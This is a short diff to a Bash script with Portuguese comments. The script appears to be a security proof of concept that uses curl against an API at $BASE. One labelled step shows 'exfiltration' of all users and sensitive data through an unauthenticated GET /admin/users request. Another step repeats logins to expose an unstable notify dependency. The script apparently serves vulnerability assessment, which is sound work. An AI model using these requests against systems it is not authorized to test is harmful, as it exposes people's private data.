@@ -21,7 +21,7 @@ curl -s -w '\nHTTP %{http_code}\n' "$BASE/auth/me" -H "Authorization: Bearer $FO
 echo -e "\n\n[4] (V3) Exfiltracao: GET /admin/users SEM autenticacao retorna todos os usuarios + dados sensiveis:" | tee -a "$OUT"
 curl -s -w '\nHTTP %{http_code}\n' "$BASE/admin/users" | tee -a "$OUT"
 
-echo -e "\n\n[5] (V2) Instabilidade por dependencia externa (notify) — mesma credencial CORRETA, 10 tentativas (200=ok / 500=falha ao notificar):" | tee -a "$OUT"
+echo -e "\n\n[5] (V2) Instabilidade por dependencia externa (notify) - mesma credencial CORRETA, 10 tentativas (200=ok / 500=falha ao notificar):" | tee -a "$OUT"
 for i in $(seq 1 10); do
   code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/auth/login" \
     -H 'Content-Type: application/json' \
